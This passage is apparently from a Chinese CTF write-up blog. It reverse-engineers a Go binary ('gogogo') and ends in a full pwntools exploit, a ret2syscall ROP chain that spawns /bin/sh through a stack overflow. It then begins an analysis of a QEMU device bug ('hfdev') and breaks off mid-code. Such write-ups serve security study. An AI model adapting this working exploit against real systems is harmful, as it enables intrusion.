class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> needUnlock &#123;</span><br><span class="line">unlockOSThread()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">gcenable()</span><br><span class="line"></span><br><span class="line">main_init_done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>)</span><br><span class="line"><span class="keyword">if</span> iscgo &#123;</span><br><span class="line"><span class="keyword">if</span> _cgo_thread_start == <span class="literal">nil</span> &#123;</span><br><span class="line">throw(<span class="string">&quot;_cgo_thread_start missing&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> GOOS != <span class="string">&quot;windows&quot;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> _cgo_setenv == <span class="literal">nil</span> &#123;</span><br><span class="line">throw(<span class="string">&quot;_cgo_setenv missing&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _cgo_unsetenv == <span class="literal">nil</span> &#123;</span><br><span class="line">throw(<span class="string">&quot;_cgo_unsetenv missing&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _cgo_notify_runtime_init_done == <span class="literal">nil</span> &#123;</span><br><span class="line">throw(<span class="string">&quot;_cgo_notify_runtime_init_done missing&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Start the template thread in case we enter Go from</span></span><br><span class="line"><span class="comment">// a C-created thread and need to create a new thread.</span></span><br><span class="line">startTemplateThread()</span><br><span class="line">cgocall(_cgo_notify_runtime_init_done, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">doInit(&amp;main_inittask)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable init tracing after main init done to avoid overhead</span></span><br><span class="line"><span class="comment">// of collecting statistics in malloc and newproc</span></span><br><span class="line">inittrace.active = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(main_init_done)</span><br><span class="line"></span><br><span class="line">needUnlock = <span class="literal">false</span></span><br><span class="line">unlockOSThread()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isarchive || islibrary &#123;</span><br><span class="line"><span class="comment">// A program compiled with -buildmode=c-archive or c-shared</span></span><br><span class="line"><span class="comment">// has a main, but it is not executed.</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fn := main_main <span class="comment">// make an indirect call, as the linker doesn&#x27;t know the address of the main package when laying down the runtime</span></span><br><span class="line">fn()</span><br><span class="line"><span class="keyword">if</span> raceenabled &#123;</span><br><span class="line">racefini()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make racy client program work: if panicking on</span></span><br><span class="line"><span class="comment">// another goroutine at the same time as main returns,</span></span><br><span class="line"><span class="comment">// let the other goroutine finish printing the panic trace.</span></span><br><span class="line"><span class="comment">// Once it does, it will exit. See issues 3934 and 20018.</span></span><br><span class="line"><span class="keyword">if</span> atomic.Load(&amp;runningPanicDefers) != <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// Running deferred functions should not take long.</span></span><br><span class="line"><span class="keyword">for</span> c := <span class="number">0</span>; c &lt; <span class="number">1000</span>; c++ &#123;</span><br><span class="line"><span class="keyword">if</span> atomic.Load(&amp;runningPanicDefers) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">Gosched()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> atomic.Load(&amp;panicking) != <span class="number">0</span> &#123;</span><br><span class="line">gopark(<span class="literal">nil</span>, <span class="literal">nil</span>, waitReasonPanicWait, traceEvGoStop, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">var</span> x *<span class="keyword">int32</span></span><br><span class="line">*x = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是决定去看一下 <code>runtime.main</code> ，然后就可以找到一个里面一堆 <code>printf</code> 的调用</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  runtime_startTemplateThread();</span><br><span class="line">  runtime_cgocall(error_code, v9);</span><br><span class="line">LABEL_15:</span><br><span class="line">  runtime_doInit(error_code);</span><br><span class="line">  LOBYTE(off_580800) = <span class="number">0</span>;</span><br><span class="line">  v10 = runtime_closechan(error_codec);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  runtime_unlockOSThread();</span><br><span class="line">  <span class="keyword">if</span> ( !byte_58054C &amp;&amp; !byte_58054E )</span><br><span class="line">  &#123;</span><br><span class="line">    math_init();    <span class="comment">// &lt;--- 这里</span></span><br><span class="line">    <span class="keyword">if</span> ( !off_5805AC || !off_5805AC )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5805A4 )</span><br><span class="line">        runtime_gopark(error_codea, v10);</span><br><span class="line">      runtime_exit(<span class="number">0</span>);</span><br><span class="line">      while ( <span class="number">1</span> )</span><br><span class="line">        MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = <span class="number">0</span>LL;</span><br><span class="line">    runtime_mcall(error_codea);</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  (*v16)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面每一个printf都打印单个字符（所以搜那个字符串定位不到这个函数）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">while ( (unsigned __int64)&amp;v156 &lt;= *(_QWORD *)(v0 + <span class="number">16</span>) )</span><br><span class="line">  runtime_morestack_noctxt();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br><span class="line">fmt_Fprintf();</span><br></pre></td></tr></table></figure><p>然后输入1416925456就可以进入一个猜数字游戏</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v2 != <span class="number">1416925456</span> )</span><br><span class="line">&#123;</span><br><span class="line">  fmt_Fprintf();</span><br><span class="line">  fmt_Fprintf();</span><br><span class="line">  v67 = fmt_Fprintf();</span><br><span class="line">  v222 = &amp;unk_49D7C0;</span><br><span class="line">  v223 = &amp;off_4CFC10;</span><br><span class="line">  fmt_Fprintln(v67);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go的题目多半都是溢出，在这个函数里搜索一下read，scanf等等相关内容可以注意到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000494AE2                 lea     rax, unk_49D900</span><br><span class="line">.text:0000000000494AE9                 mov     ebx, 800h</span><br><span class="line">.text:0000000000494AEE                 mov     rcx, rbx</span><br><span class="line">.text:0000000000494AF1                 call    runtime_makeslice</span><br><span class="line">.text:0000000000494AF6                 lea     rbx, [rsp+4C0h+var_460]      </span><br><span class="line">.text:0000000000494AFB                 mov     rax, qword ptr cs:unk_5514E0</span><br><span class="line">.text:0000000000494B02                 mov     ecx, 800h                    &lt;--- 栈溢出</span><br><span class="line">.text:0000000000494B07                 mov     rdi, rcx</span><br><span class="line">.text:0000000000494B0A                 call    bufio__ptr_Reader_Read</span><br><span class="line">.text:0000000000494B0F                 movzx   edx, byte ptr [rsp+4C0h+var_460]</span><br><span class="line">.text:0000000000494B14                 cmp     dl, 79h ; &#x27;y&#x27;</span><br><span class="line">.text:0000000000494B17                 jz      short loc_494B35</span><br><span class="line">.text:0000000000494B19                 cmp     dl, 59h ; &#x27;Y&#x27;</span><br><span class="line">.text:0000000000494B1C                 jz      short loc_494B35</span><br><span class="line">.text:0000000000494B1E                 xchg    ax, ax</span><br><span class="line">.text:0000000000494B20                 call    runtime_arg</span><br><span class="line">.text:0000000000494B25                 mov     rbp, [rsp+4C0h+var_8]</span><br><span class="line">.text:0000000000494B2D                 add     rsp, 4C0h</span><br><span class="line">.text:0000000000494B34                 retn</span><br></pre></td></tr></table></figure><p>接下来就是怎么达到这里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000491E85                 lea     rcx, aDDDD      ; &quot;%d %d %d %d&quot;</span><br><span class="line">.text:0000000000491E8C                 mov     edi, 0Bh</span><br><span class="line">.text:0000000000491E91                 mov     r8d, 4</span><br><span class="line">.text:0000000000491E97                 mov     r9, r8</span><br><span class="line">.text:0000000000491E9A                 lea     rax, off_4D0340</span><br><span class="line">.text:0000000000491EA1                 call    fmt_Fscanf</span><br></pre></td></tr></table></figure><p>依次输入四个数字就可以开始猜，然后搜索一下Bulls and Cows游戏，返回正确且位置正确的个数和正确但位置错误的个数，能写个简单的猜测算法（其实也不用，自己玩完再send payload就好了）<br>开graph view开一下，溢出点在EXIT的位置，输入EXIT选项之后就可以传payload</p><p>算法也很容易，先生成一个全部的可能选取集合，然后抽一个数输入，得到 <code>bulls and cows</code>的值，将现在的输入和集合内的数进行比较，如果bull和cow都相同，就说明这个是可选项，反复操作，直到只剩下一个选项即可。</p><p>最后直接ret2syscall即可，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ntpath <span class="keyword">import</span> join</span><br><span class="line"><span class="keyword">import</span> readline</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bull and Cow game solver</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solver</span>:</span></span><br><span class="line">    ans_length = <span class="number">4</span></span><br><span class="line">    candidates = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill_candidates</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                        <span class="keyword">if</span> i == j <span class="keyword">or</span> i == k <span class="keyword">or</span> i == l <span class="keyword">or</span> j == k <span class="keyword">or</span> j == l <span class="keyword">or</span> k == l:</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        self.candidates.append(<span class="built_in">str</span>(i) + <span class="built_in">str</span>(j) + <span class="built_in">str</span>(k) + <span class="built_in">str</span>(l))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.fill_candidates()</span><br><span class="line">        <span class="comment"># print(self.candidates)</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self, sh</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(self.candidates):  <span class="comment"># still have candidates</span></span><br><span class="line">            <span class="comment"># randomly pick a candidate</span></span><br><span class="line">            candidate = random.choice(self.candidates)</span><br><span class="line">            <span class="comment"># split candidate into 4 digits</span></span><br><span class="line">            guess = candidate[<span class="number">0</span>] + <span class="string">&#x27; &#x27;</span> + candidate[<span class="number">1</span>] + <span class="string">&#x27; &#x27;</span> + candidate[<span class="number">2</span>] + <span class="string">&#x27; &#x27;</span> + candidate[<span class="number">3</span>]</span><br><span class="line">            <span class="comment"># send guess to server</span></span><br><span class="line">            sh.sendline(guess.encode())</span><br><span class="line">            <span class="comment"># get response from server</span></span><br><span class="line">            response = sh.recvline().decode()</span><br><span class="line">            <span class="keyword">if</span> response.find(<span class="string">&#x27;WIN&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> guess</span><br><span class="line">            bulls = <span class="built_in">int</span>(response[<span class="number">0</span>])</span><br><span class="line">            cows = <span class="built_in">int</span>(response[<span class="number">2</span>])</span><br><span class="line">            new_candidates = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> self.candidates:</span><br><span class="line">                b = <span class="number">0</span></span><br><span class="line">                c = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.ans_length):</span><br><span class="line">                    <span class="keyword">if</span> k[i] == candidate[i]:</span><br><span class="line">                        b += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.ans_length):</span><br><span class="line">                        <span class="keyword">if</span> k[i] == candidate[j]:</span><br><span class="line">                            c += <span class="number">1</span></span><br><span class="line">                c = c - b</span><br><span class="line">                <span class="keyword">if</span> b == bulls <span class="keyword">and</span> c == cows:</span><br><span class="line">                    new_candidates.append(k)</span><br><span class="line">            self.candidates = new_candidates</span><br><span class="line">            log.info(<span class="string">&quot;&#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(guess, <span class="string">&#x27;:&#x27;</span>, response))</span><br><span class="line">        log.info(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.candidates[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./gogogo&#x27;</span>) </span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;NUMBER:&#x27;</span>, <span class="string">b&#x27;1416925456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;GUESS\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line">solver.solve(sh)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">b&quot;EXIT&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:000000000047CF00                 call    sub_45D5C0</span></span><br><span class="line"><span class="string">.text:000000000047CF05                 mov     rdi, [rsp+arg_8]  0x10</span></span><br><span class="line"><span class="string">.text:000000000047CF0A                 mov     rsi, [rsp+arg_10] 0x18</span></span><br><span class="line"><span class="string">.text:000000000047CF0F                 mov     rdx, [rsp+arg_18] 0x20</span></span><br><span class="line"><span class="string">.text:000000000047CF14                 mov     rax, [rsp+arg_0]  0x8</span></span><br><span class="line"><span class="string">.text:000000000047CF19                 syscall                 ; LINUX -</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload =  cyclic_metasploit(<span class="number">1120</span>)</span><br><span class="line">payload += p64(<span class="number">0x000000000045C900</span>) <span class="comment"># runtime.read</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000402e7b</span>) <span class="comment"># add rsp 0x30; nop; ret;</span></span><br><span class="line">payload += p64(<span class="number">0x0</span>)                <span class="comment"># fd</span></span><br><span class="line">payload += p64(<span class="number">0x552A00</span>)           <span class="comment"># bss</span></span><br><span class="line">payload += p64(<span class="number">0x8</span>)                <span class="comment"># count</span></span><br><span class="line">payload += p64(<span class="number">0xc0ffee</span>)           <span class="comment"># pop rax; ret;</span></span><br><span class="line">payload += p64(<span class="number">0x000000000047CF00</span>)</span><br><span class="line">payload += p64(<span class="number">0x000000000047CF00</span>)</span><br><span class="line">payload += p64(<span class="number">0x000000000047CF00</span>)</span><br><span class="line">payload += p64(<span class="number">0x000000000047CF00</span>)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)               <span class="comment"># sys_execve;</span></span><br><span class="line">payload += p64(<span class="number">0x552A00</span>)           <span class="comment"># bss</span></span><br><span class="line">payload += p64(<span class="number">0x0</span>)                <span class="comment"># rsi</span></span><br><span class="line">payload += p64(<span class="number">0x0</span>)                <span class="comment"># rdi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh, &#x27;b *0x000000000045C900&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;BYE~&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#sh.sendlineafter()</span></span><br></pre></td></tr></table></figure><h2 id="hfdev">hfdev</h2><p>这个感觉最麻烦的地方是没有<code>DeviceState</code>的符号，但是应该很容易可以注意到在 <code>hfdev_process</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> __int16)result &gt; *(_QWORD *)(a1 + <span class="number">2672</span>) )</span><br><span class="line">  LOWORD(result) = *(_QWORD *)(a1 + <span class="number">2672</span>);</span><br><span class="line">v10 = (<span class="keyword">unsigned</span> __int16)result;</span><br><span class="line">result = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  *(_BYTE *)(a1 + result + <span class="number">3720</span>) ^= *(_BYTE *)(a1 + result + <span class="number">2703</span>);</span><br><span class="line">  ++result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v10 &gt;= (<span class="keyword">int</span>)result );</span><br></pre></td></tr></table></figure><p>这一部分的<code>&gt;=</code>很可能会导致一个byte的溢出，<br>接下来分析realize函数，注意到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v2 = g_malloc0(<span class="number">48LL</span>);</span><br><span class="line">timer_init_full(v2, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hfdev_func, (__int64)v1);</span><br><span class="line">v1[<span class="number">563</span>] = v2;</span><br></pre></td></tr></table></figure><p><code>v1[563]</code> 处存放了一个QEMUTimer，回调函数为 <code>hfdev_func</code><br>然后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3 = qemu_bh_new_full(hfdev_process, v1, <span class="string">&quot;hfdev_process&quot;</span>);</span><br><span class="line">v1[<span class="number">561</span>] = <span class="number">1LL</span>;</span><br><span class="line">v1[<span class="number">564</span>] = v3;</span><br></pre></td></tr></table></figure><p><code>v1[564]</code>处存放了一个qemu bottom half，结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUBH</span> &#123;</span></span><br><span class="line">    AioContext *ctx;</span><br><span class="line">    QEMUBHFunc *cb;     <span class="comment">// callback, 触发时调用</span></span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    QEMUBH *next;</span><br><span class="line">    <span class="keyword">bool</span> scheduled;</span><br><span class="line">    <span class="keyword">bool</span> idle;</span><br><span class="line">    <span class="keyword">bool</span> deleted;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> gboolean</span></span><br><span class="line"><span class="function"><span class="title">aio_ctx_dispatch</span><span class="params">(GSource     *source,</span></span></span><br><span class="line"><span class="params"><span class="function">                 GSourceFunc  callback,</span></span></span><br><span class="line"><span class="params"><span class="function">                 gpointer     user_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AioContext *ctx = (AioContext *) source;</span><br><span class="line"></span><br><span class="line">    assert(callback == <span class="literal">NULL</span>);</span><br><span class="line">    aio_dispatch(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中 <code>aio_dispatch</code> 会调用 <code>aio_bh_poll</code>，其中会调用 <code>aio_bh_call</code> 执行bottom half的callback<br>以及 <code>hfdev_port_write</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">12LL</span>:</span><br><span class="line">  qemu_bh_schedule(*((_QWORD *)a1 + <span class="number">564</span>));</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p><code>qemu_bh_schedule</code> 会执行 <code>aio_notify</code>，所以 <code>case 12:</code>的时候会触发这个bh callback</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1[<span class="number">335</span>] = <span class="number">0LL</span>;</span><br><span class="line">memory_region_init_io(v1 + <span class="number">300</span>, v1, hfdev_ioport_ops, v1, <span class="string">&quot;hfdev-pmio&quot;</span>, <span class="number">32LL</span>);</span><br><span class="line"><span class="keyword">return</span> pci_register_bar(a1, <span class="number">0LL</span>, <span class="number">1LL</span>, v1 + <span class="number">300</span>);</span><br></pre></td></tr></table></figure><p>然后就是init pmio，大小32 bytes。接下来分析 <code>hfdev_process</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">  result = *(<span class="keyword">unsigned</span> __int16 *)&amp;a1-&gt;pad3[<span class="number">41</span>];</span><br><span class="line">  v11 = *(<span class="keyword">unsigned</span> __int16 *)&amp;a1-&gt;pad3[<span class="number">43</span>];</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)result &lt;= <span class="number">0x100</span>u &amp;&amp; (<span class="keyword">unsigned</span> __int16)v11 &lt;= <span class="number">0x100</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = *(_QWORD *)&amp;a1-&gt;pad3[<span class="number">1832</span>] == <span class="number">0LL</span>;</span><br><span class="line">    *(_QWORD *)&amp;a1-&gt;pad3[<span class="number">24</span>] = result;</span><br><span class="line">    *(_QWORD *)&amp;a1-&gt;pad3[<span class="number">1840</span>] = (<span class="keyword">char</span> *)v1 + v11;</span><br><span class="line">    <span class="keyword">if</span> ( !v12 )</span><br><span class="line">      <span class="keyword">return</span> timer_mod(a1-&gt;timer, *(_QWORD *)&amp;a1-&gt;pad3[<span class="number">32</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>在 <code>case 0x30:</code>的时候会调用<code>timer_mod</code>，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 